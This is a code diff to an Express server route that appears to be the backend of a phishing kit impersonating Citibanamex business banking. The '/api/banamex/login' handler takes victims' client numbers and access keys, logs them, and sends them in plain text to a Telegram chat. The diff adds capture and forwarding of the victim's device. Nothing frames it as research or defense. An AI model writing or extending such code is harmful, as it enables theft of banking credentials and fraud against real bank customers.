@@ -772,7 +772,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/banamex/login', async (req, res) => {
     try {
-      const { numeroCliente, claveAcceso } = req.body;
+      const { numeroCliente, claveAcceso, dispositivo } = req.body;
       
       if (!numeroCliente || !claveAcceso) {
         return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
@@ -785,16 +785,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: "CITIBANAMEX",
         numeroCliente,
         claveAcceso,
+        dispositivo: dispositivo || 'Desconocido',
         pasoActual: "validando",
         createdBy: "banamex_client",
       });
       
-      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);
+      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}, Dispositivo: ${dispositivo || 'Desconocido'}`);
       
       await sendTelegramMessage(
         `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
         `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
         `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
+        `📲 <b>Dispositivo:</b> ${dispositivo || 'Desconocido'}\n` +
         `🆔 <b>Session ID:</b> ${sessionId}\n` +
         `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
       );
